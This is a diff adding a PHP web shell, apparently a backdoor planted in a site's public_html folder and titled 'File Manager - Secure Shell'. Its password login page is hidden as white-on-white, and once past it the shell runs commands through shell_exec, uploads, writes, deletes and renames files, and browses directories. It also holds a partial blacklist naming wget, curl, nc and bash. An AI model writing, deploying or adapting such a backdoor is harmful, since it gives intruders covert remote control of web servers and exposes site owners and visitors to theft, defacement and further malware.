@@ -1,0 +1,288 @@
+<?php
+session_start();
+
+// Password baru yang sudah di-hash dengan bcrypt
+$password = '$2y$10$x2XoZ2BnfRF0CIUKe9kE9.ub/qTZS09RDaHnglNVLAwIMFeyrZWmC'; // Ganti dengan hash bcrypt yang benar (lampha-thau)
+
+function login_shell()
+{
+?>
+<html>
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #fff;
+            background-size: cover;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        .login-container {
+            background: rgb(255, 255, 255); /* Transparansi latar belakang form */
+            padding: 20px;
+            border-radius: 8px;
+            color: #fff;
+            box-shadow: 0 4px 8px rgb(255, 255, 255);
+            margin-top: 720px;
+        }
+
+        .login-container input[type="password"] {
+            padding: 10px;
+            margin-right: 10px;
+            border: 1px solid #ffffff;
+            border-radius: 4px;
+            background: transparent;
+            color: #000000;
+            outline: none;
+        }
+
+        .login-container input[type="password"]::placeholder {
+            color: #ffffff;
+        }
+
+        .login-container input[type="submit"] {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            background: #ffffff;
+            color: #ffffff;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background: #ffffff;
+        }
+
+        .marquee-container {
+            position: fixed;
+            bottom: 0;
+            left: 500px;
+            right: 500px;
+            height: 50px;
+            overflow: hidden;
+            background: rgb(255, 255, 255);
+            display: flex;
+            align-items: center;
+            color: #fff;
+        }
+
+        .marquee {
+            white-space: nowrap;
+            display: inline-block;
+            padding-left: 75%;
+            animation: marquee 10s linear infinite;
+        }
+
+        @keyframes marquee {
+            from {
+                transform: translateX(100%);
+            }
+            to {
+                transform: translateX(-100%);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="marquee-container">
+        <div class="marquee">
+            copyright © SEOLB03
+        </div>
+    </div>
+    <div class="login-container">
+        <form action="" method="post">
+            <div align="center">
+                <input type="password" name="pass" placeholder="Password" required>
+                <input type="submit" name="submit" value="Login">
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+<?php
+    exit;
+}
+
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+        header("refresh: 0;");
+    } else {
+        login_shell();
+    }
+}
+?>
+<?php
+$BASE_DIR = realpath('/home/uni10000/public_html');
+error_reporting(0);
+
+function clean_input($input) {
+    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
+}
+
+function safe_path($path) {
+    global $BASE_DIR;
+    $real = realpath($path);
+    if ($real && strpos($real, $BASE_DIR) === 0) {
+        return $real;
+    }
+    return $BASE_DIR;
+}
+
+function x($b) { return base64_encode($b); }
+function d($b) { return base64_decode($b); }
+
+$currentDirectory = safe_path(isset($_GET['d']) ? d($_GET['d']) : $BASE_DIR);
+chdir($currentDirectory);
+
+function safe_shell($cmd) {
+    $blacklist = ['rm ', 'wget', 'curl', 'nc', 'python', 'perl', 'bash', 'sh', '`', '$(', '&&', '|', ';'];
+    foreach ($blacklist as $danger) {
+        if (stripos($cmd, $danger) !== false) {
+            return false;
+        }
+    }
+    return $cmd;
+}
+
+function deleteDirectory($dir) {
+    if (!is_dir($dir)) return unlink($dir);
+    foreach (scandir($dir) as $item) {
+        if ($item == '.' || $item == '..') continue;
+        deleteDirectory($dir . DIRECTORY_SEPARATOR . $item);
+    }
+    return rmdir($dir);
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['cmd_input'])) {
+        $cmd = safe_shell($_POST['cmd_input']);
+        if ($cmd !== false) {
+            $output = shell_exec($cmd . ' 2>&1');
+            echo "<pre>" . htmlspecialchars($output) . "</pre>";
+        } else {
+            echo "<pre>Blocked command for security reasons.</pre>";
+        }
+    } elseif (isset($_POST['delete_file'])) {
+        $target = safe_path($currentDirectory . '/' . basename($_POST['delete_file']));
+        if (file_exists($target)) {
+            is_dir($target) ? deleteDirectory($target) : unlink($target);
+        }
+    } elseif (isset($_POST['file_name']) && isset($_POST['file_content'])) {
+        $filename = basename(clean_input($_POST['file_name']));
+        $filecontent = $_POST['file_content'];
+        $fullPath = $currentDirectory . '/' . $filename;
+        file_put_contents($fullPath, $filecontent);
+    } elseif (isset($_POST['folder_name'])) {
+        $folder = basename(clean_input($_POST['folder_name']));
+        $folderPath = $currentDirectory . '/' . $folder;
+        if (!file_exists($folderPath)) mkdir($folderPath, 0755, true);
+    } elseif (isset($_POST['upload']) && isset($_FILES['file'])) {
+        $target_file = $currentDirectory . '/' . basename($_FILES["file"]["name"]);
+        move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
+    } elseif (isset($_POST['view_file'])) {
+        $viewFile = safe_path($currentDirectory . '/' . basename($_POST['view_file']));
+        if (file_exists($viewFile) && is_file($viewFile)) {
+            echo "<hr><textarea style='width:100%;height:200px'>" . htmlspecialchars(file_get_contents($viewFile)) . "</textarea>";
+        }
+    } elseif (isset($_POST['rename_item'], $_POST['old_name'], $_POST['new_name'])) {
+        $oldName = basename($_POST['old_name']);
+        $newName = basename($_POST['new_name']);
+        $old = safe_path($currentDirectory . '/' . $oldName);
+        $new = safe_path($currentDirectory . '/' . $newName);
+
+        // Jangan rename jika nama baru kosong
+        if (!empty($newName) && file_exists($old)) {
+            rename($old, $new);
+        }
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Manager - Secure Shell</title>
+    <style>
+        body { background:#1e1e1e; color:#eee; font-family:monospace; padding:20px; }
+        input, textarea { width:100%; padding:5px; margin:5px 0; border-radius:3px; }
+        table { width:100%; border-collapse:collapse; margin-top:20px; }
+        th, td { border:1px solid #444; padding:8px; text-align:left; }
+        a { color:#0af; text-decoration:none; }
+        .actions form { display:inline-block; margin:0 3px; }
+    </style>
+</head>
+<body>
+    <h2>📁 File Manager - Secure Shell</h2>
+
+    <p><strong>Current Directory:</strong> <?php echo $currentDirectory; ?></p>
+    <?php
+        $parent = dirname($currentDirectory);
+        if ($parent !== $currentDirectory && strpos($parent, $BASE_DIR) === 0) {
+            echo "<p><a href='?d=" . x($parent) . "'>⬅️ Go to Parent Directory</a></p>";
+        }
+    ?>
+
+    <form method="post" enctype="multipart/form-data">
+        <input type="file" name="file">
+        <input type="submit" name="upload" value="Upload File">
+    </form>
+
+    <form method="post">
+        <input type="text" name="folder_name" placeholder="Folder Name">
+        <input type="submit" value="Create Folder">
+    </form>
+
+    <form method="post">
+        <input type="text" name="file_name" placeholder="File Name">
+        <textarea name="file_content" placeholder="Content or edit existing file..."></textarea>
+        <input type="submit" value="Create / Edit File">
+    </form>
+
+    <form method="post">
+        <input type="text" name="cmd_input" placeholder="Enter command (safe only)">
+        <input type="submit" value="Execute">
+    </form>
+
+    <table>
+        <tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
+        <?php
+        foreach (scandir($currentDirectory) as $item) {
+            if ($item === '.' || $item === '..') continue;
+
+            $fullPath = $currentDirectory . '/' . $item;
+            $isDir = is_dir($fullPath);
+            $size = $isDir ? '-' : filesize($fullPath);
+            $mod = date("Y-m-d H:i:s", filemtime($fullPath));
+            $display = htmlspecialchars($item);
+            $link = $isDir ? "<a href='?d=" . x($fullPath) . "'>$display</a>" : $display;
+
+            echo "<tr>
+                <td>{$link}</td>
+                <td>{$size}</td>
+                <td>{$mod}</td>
+                <td class='actions'>
+                    <form method='post'><input type='hidden' name='view_file' value='{$item}'><input type='submit' value='View'></form>
+                    <form method='post'><input type='hidden' name='delete_file' value='{$item}'><input type='submit' value='Delete'></form>
+                    <form method='post'>
+                        <input type='hidden' name='old_name' value='{$item}'>
+                        <input type='text' name='new_name' placeholder='New Name'>
+                        <input type='submit' name='rename_item' value='Rename'>
+                    </form>
+                </td>
+            </tr>";
+        }
+        ?>
+    </table>
+</body>
+</html>
